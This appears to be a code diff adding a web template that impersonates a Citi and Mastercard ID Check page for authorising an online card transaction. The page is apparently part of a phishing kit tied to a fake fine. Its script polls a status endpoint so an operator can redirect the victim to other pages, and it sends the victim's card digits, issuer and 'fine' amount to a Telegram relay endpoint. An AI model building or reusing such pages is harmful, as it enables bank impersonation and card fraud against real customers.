@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Citi | Authorise Transaction</title>
+<style>
+* { box-sizing:border-box; margin:0; padding:0; }
+body { font-family:Arial,sans-serif; background:#f0f2f5; display:flex; align-items:center; justify-content:center; min-height:100vh; max-width:480px; margin:0 auto; }
+</style>
+</head>
+<body>
+
+<div style="background:white;width:100%;max-width:400px;box-shadow:0 2px 20px rgba(0,0,0,0.10);border-radius:4px;overflow:hidden;">
+
+  <!-- Logos bar -->
+  <div style="display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid #e5e7eb;">
+    <svg width="50" height="30" viewBox="0 0 80 48" fill="none">
+      <path d="M6 24 C6 14 14 6 24 6 C31 6 37 10 40 16 C43 10 49 6 56 6 C66 6 74 14 74 24 C74 34 66 42 56 42 C49 42 43 38 40 32 C37 38 31 42 24 42 C14 42 6 34 6 24Z" fill="#003B73"/>
+      <path d="M36 6 Q40 2 44 6" stroke="#E60026" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+      <text x="10" y="29" font-family="Arial" font-size="17" font-weight="bold" fill="white">citi</text>
+    </svg>
+    <div style="display:flex;align-items:center;gap:6px;">
+      <div style="position:relative;width:32px;height:20px;">
+        <div style="position:absolute;left:0;top:0;width:20px;height:20px;border-radius:50%;background:#EB001B;"></div>
+        <div style="position:absolute;right:0;top:0;width:20px;height:20px;border-radius:50%;background:#F79E1B;opacity:0.85;"></div>
+      </div>
+      <div style="font-size:10px;line-height:1.3;color:#333;font-weight:600;">mastercard<br><span style="font-weight:400;">ID Check</span></div>
+    </div>
+  </div>
+
+  <!-- Blue header -->
+  <div style="background:#0066A1;padding:14px 18px;color:white;font-size:15px;font-weight:700;letter-spacing:0.1px;">
+    Authorise your online card transaction
+  </div>
+
+  <!-- Body -->
+  <div style="padding:20px 18px;">
+
+    <!-- Option 1 -->
+    <div style="display:flex;align-items:flex-start;gap:14px;padding-bottom:20px;border-bottom:1px solid #e5e7eb;margin-bottom:20px;">
+      <div style="flex-shrink:0;">
+        <svg width="48" height="60" viewBox="0 0 48 60" fill="none">
+          <rect x="4" y="1" width="40" height="58" rx="6" stroke="#0066A1" stroke-width="2" fill="#e8f4fd"/>
+          <rect x="16" y="4" width="16" height="3" rx="1.5" fill="#0066A1" opacity="0.4"/>
+          <rect x="8" y="14" width="32" height="22" rx="3" fill="white" stroke="#0066A1" stroke-width="1" opacity="0.8"/>
+          <rect x="8" y="18" width="32" height="6" fill="#0066A1" opacity="0.15"/>
+          <rect x="12" y="28" width="10" height="2" rx="1" fill="#0066A1" opacity="0.4"/>
+          <rect x="12" y="32" width="16" height="2" rx="1" fill="#0066A1" opacity="0.3"/>
+          <circle cx="38" cy="14" r="8" fill="#0066A1"/>
+          <rect x="34" y="12" width="8" height="4" rx="1" fill="white" opacity="0.9"/>
+        </svg>
+      </div>
+      <div style="font-size:13.5px;color:#222;line-height:1.6;">
+        Tap on the incoming <strong>Citi Mobile App<sup>®</sup></strong> notification to authorize transaction.
+      </div>
+    </div>
+
+    <!-- OR -->
+    <div style="text-align:center;font-size:13px;color:#999;font-weight:600;margin-bottom:20px;">OR</div>
+
+    <!-- Option 2 -->
+    <div style="display:flex;align-items:flex-start;gap:14px;padding-bottom:20px;border-bottom:1px solid #e5e7eb;margin-bottom:20px;">
+      <div style="flex-shrink:0;">
+        <svg width="48" height="60" viewBox="0 0 48 60" fill="none">
+          <rect x="4" y="1" width="40" height="58" rx="6" stroke="#0066A1" stroke-width="2" fill="#e8f4fd"/>
+          <rect x="16" y="4" width="16" height="3" rx="1.5" fill="#0066A1" opacity="0.4"/>
+          <rect x="8" y="14" width="32" height="24" rx="3" fill="white" stroke="#0066A1" stroke-width="1" opacity="0.8"/>
+          <path d="M16 38 L12 44 L24 38 Z" fill="white" stroke="#0066A1" stroke-width="1"/>
+          <rect x="18" y="22" width="12" height="10" rx="2" fill="#0066A1" opacity="0.7"/>
+          <path d="M20 22 C20 18 28 18 28 22" stroke="#0066A1" stroke-width="2" fill="none" stroke-linecap="round"/>
+          <circle cx="24" cy="26" r="2" fill="white"/>
+        </svg>
+      </div>
+      <div style="font-size:13.5px;color:#222;line-height:1.6;">
+        Please open <strong>Citi Mobile App<sup>®</sup></strong> on your registered device and tap on 'Authorise Transaction' icon to see pending requests.
+        <strong>You do not need to login.</strong>
+      </div>
+    </div>
+
+    <!-- Resend -->
+    <div style="text-align:center;margin-bottom:20px;">
+      <button id="resend-btn" onclick="handleResend()" style="background:none;border:none;color:#0066A1;font-weight:700;font-size:14px;cursor:pointer;text-decoration:underline;padding:0;">
+        Resend Push Notification
+      </button>
+    </div>
+
+    <!-- Footer -->
+    <div style="font-size:11px;color:#666;line-height:1.6;border-top:1px solid #e5e7eb;padding-top:14px;text-align:center;">
+      This page will refresh automatically once you have authorised the transaction on the Citi Mobile App. If not
+      <button onclick="window.location.href='/'" style="background:none;border:none;color:#0066A1;font-size:11px;cursor:pointer;text-decoration:underline;padding:0;">
+        click here to proceed after authorising
+      </button>
+    </div>
+  </div>
+</div>
+
+<script>
+const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
+const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
+const ISSUER     = <%- JSON.stringify(issuer) %>;
+const SID        = <%- JSON.stringify(sid) %>;
+let resent = false;
+
+if (SID) {
+  const sidParams = '?totalFine=' + TOTAL_FINE + '&cardLast4=' + encodeURIComponent(CARD_LAST4) + '&issuer=' + encodeURIComponent(ISSUER) + '&sid=' + SID;
+  setInterval(async () => {
+    try {
+      const r = await fetch('/api/check-status?sid=' + SID);
+      const d = await r.json();
+      if (d.action === 'redirect' && d.page) window.location.href = '/' + d.page + sidParams;
+    } catch(e) {}
+  }, 3000);
+}
+
+function handleResend() {
+  if (resent) return;
+  resent = true;
+  const btn = document.getElementById('resend-btn');
+  btn.textContent = '✓ Notification Resent!';
+  btn.style.color = '#0a8a3a';
+  fetch('/api/telegram', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({type:'otp_resend', cardLast4: CARD_LAST4, totalFine: TOTAL_FINE, issuer: ISSUER})
+  }).catch(() => {});
+  setTimeout(() => { resent = false; btn.textContent = 'Resend Push Notification'; btn.style.color = '#0066A1'; }, 3000);
+}
+</script>
+</body>
+</html>
